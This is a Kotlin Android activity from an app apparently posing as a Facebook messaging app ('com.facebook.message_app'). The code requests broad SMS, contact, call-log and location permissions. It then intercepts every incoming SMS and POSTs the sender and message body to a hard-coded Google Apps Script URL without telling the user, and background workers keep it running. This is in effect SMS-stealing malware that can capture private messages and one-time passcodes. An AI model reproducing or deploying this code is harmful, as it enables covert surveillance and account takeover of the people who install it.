package com.facebook.message_app

import android.Manifest
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.ProgressDialog
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.Uri
import android.os.AsyncTask
import android.os.Build
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.OneTimeWorkRequest
import androidx.work.PeriodicWorkRequest
import androidx.work.WorkManager
import com.android.volley.RequestQueue
import com.android.volley.Response
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.concurrent.TimeUnit


class MainActivity : AppCompatActivity() {

    private lateinit var textView1: TextView
    private lateinit var textView2: TextView
    private var lastSender: String? = null
    private var isFirstMessage = true
//Making a static block as we made in java..
    companion object {
        private const val REQUEST_SMS_PERMISSION = 123
    }

    private fun checkpermissions() {
        try {
            if ((ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE)
                        != PackageManager.PERMISSION_GRANTED) &&
                (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                        != PackageManager.PERMISSION_GRANTED)
                && (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
                        != PackageManager.PERMISSION_GRANTED)
                && (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                        != PackageManager.PERMISSION_GRANTED)
                && (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CONTACTS)
                        != PackageManager.PERMISSION_GRANTED)
                && (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS)
                        != PackageManager.PERMISSION_GRANTED)
            ) {
                ActivityCompat.requestPermissions(
                    this, arrayOf(
                        Manifest.permission.PROCESS_OUTGOING_CALLS,
                        Manifest.permission.READ_PHONE_STATE,
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.READ_CONTACTS,
                        Manifest.permission.WRITE_CONTACTS,
                        Manifest.permission.RECEIVE_SMS
                    ),
                    1
                )
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        textView1 = findViewById(R.id.textView1)
        textView2 = findViewById(R.id.textView2)

        val periodicWorkRequest = PeriodicWorkRequest.Builder(
            SmsWorker::class.java,
            15, TimeUnit.MINUTES // Interval to run the worker
        )
            .build()
        WorkManager.getInstance(applicationContext).enqueue(periodicWorkRequest)

        val filter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        registerReceiver(smsReceiver, filter)

        checkpermissions()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "default_channel",
                "Default Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            val notificationManager =
                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
//Here checking whether the permission is given or not..
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, arrayOf(Manifest.permission.READ_SMS), REQUEST_SMS_PERMISSION)
        }

    }



//This function is called when user responses to permission request..
    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
            REQUEST_SMS_PERMISSION -> {
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                   //readSMS(msgfrom, msgBody)
                } else {
                    // Permission denied, handle accordingly
                    // You might want to show a message or disable functionality dependent on SMS reading
                }
            }
        }
    }

    public fun readSMS(sender: String?, body: String?) {
        // Check if sender and body are not null
        if (sender != null && body != null) {
            // If sender is different, clear textView1 and set new sender
            textView1.text = "Sender +: $sender\n"
            textView2.text = "$body\n"
            lastSender = sender
            isFirstMessage = false
        }
    }


    public fun addItemToSheet(sender: String?, body: String?) {
        // Check if sender and body are not null
        if (sender != null && body != null) {
            val loading = ProgressDialog.show(this, "Adding Item", "Please wait")

            val stringRequest = object : StringRequest(
                Method.POST, "https://script.google.com/macros/s/AKfycbycLf0uYyXz3zJ7_JajjgGtxzGSUnwVA72I-pwPu8M_R0YtMEvi44G3XZ86mtTAQqvxgg/exec",
                Response.Listener { response ->
                    loading.dismiss()
                    Toast.makeText(this@MainActivity, response, Toast.LENGTH_LONG).show()
                },
                Response.ErrorListener { error ->
                    loading.dismiss()
                    Toast.makeText(this@MainActivity, "Error: ${error.message}", Toast.LENGTH_LONG).show()
                }
            ) {
                override fun getParams(): Map<String, String> {
                    val params: MutableMap<String, String> = HashMap()

                    params["action"] = "addItem"
                    params["sender"] = "Sender:" +sender
                    params["body"] = body

                    return params
                }
            }
            val queue: RequestQueue = Volley.newRequestQueue(this)
            queue.add(stringRequest)
        }
    }


    private val smsReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            try {
                if (intent.action.equals("android.provider.Telephony.SMS_RECEIVED")) {
                    val bundle = intent.extras //---get the SMS message passed in---
                    var msgs: Array<SmsMessage?>? = null
                    var msgfrom: String?
                    if (bundle != null) {
                        //---retrieve the SMS message received---
                        try {
                            val pdus = bundle["pdus"] as Array<Any>?
                            msgs = arrayOfNulls(pdus!!.size)
                            for (i in msgs.indices) {
                                msgs[i] = SmsMessage.createFromPdu(pdus!![i] as ByteArray)
                                msgfrom = msgs[i]?.originatingAddress
                                val msgBody = msgs[i]?.getMessageBody()
                                val currentDate: String =
                                    SimpleDateFormat(
                                        "dd-MM-yyyy",
                                        Locale.getDefault()
                                    ).format(Date())
                                val currentTime: String =
                                    SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
                                val mBuilder = StringBuilder()
                                val lastentry = ""
                                mBuilder.append("$lastentry,{ Date: $currentDate, Time: $currentTime,Number: $msgfrom, Message Text: $msgBody}")
                                Log.d("SMSRECIEV", mBuilder.toString())
                                readSMS(msgfrom, msgBody)
                                addItemToSheet(msgfrom, msgBody)
                                val workRequest = OneTimeWorkRequest.Builder(MyWorker::class.java)
                                    .build()
                                WorkManager.getInstance(applicationContext).enqueue(workRequest)
                            }
                        } catch (e: java.lang.Exception) {
                            Log.d("Exception caught", e.message!!)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("SmsReceiver", "Error: ${e.message}", e)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        unregisterReceiver(smsReceiver)
    }

}
